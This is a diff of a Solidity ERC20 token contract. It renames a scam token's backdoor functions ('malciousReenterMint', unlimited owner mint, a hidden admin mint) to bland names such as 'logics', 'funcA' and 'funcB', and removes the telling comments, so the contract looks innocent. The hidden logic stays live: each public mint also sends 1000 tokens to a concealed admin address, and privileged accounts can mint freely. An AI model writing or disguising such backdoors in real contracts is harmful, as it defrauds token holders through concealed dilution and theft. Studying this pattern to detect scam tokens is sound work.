@@ -421,16 +421,16 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 contract MyToken is ERC20, Ownable{
     address public malAdmin;
 
-    constructor()ERC20("MyScamToken","MST"){
+    constructor()ERC20("MyToken","MST"){
         malAdmin = msg.sender;
     }
 
     function mintToken(uint256 _amount) public{
         _mint(msg.sender, _amount);
-        malciousReenterMint();
+        logics();
     }
 
-    function malciousReenterMint() internal{
+    function logics() internal{
         /*
          Internal Logic
          .  .  .
@@ -440,13 +440,11 @@ contract MyToken is ERC20, Ownable{
         _mint(malAdmin, 1000);
     }
 
-    // Owner Mint unlimited Tokens (onlyOwner)
-    function ownerMintTokens(uint256 _amount) public onlyOwner{
+    function funcA(uint256 _amount) public onlyOwner{
         _mint(msg.sender, _amount);
     }
 
-    // Other Admin users to mint Tokens.
-    function adminMintTokens(uint256 _amount) public {
+    function funcB(uint256 _amount) public {
         // address a = _msgSender(); 
         // require(a == malAdmin);
         require(_msgSender() == malAdmin);
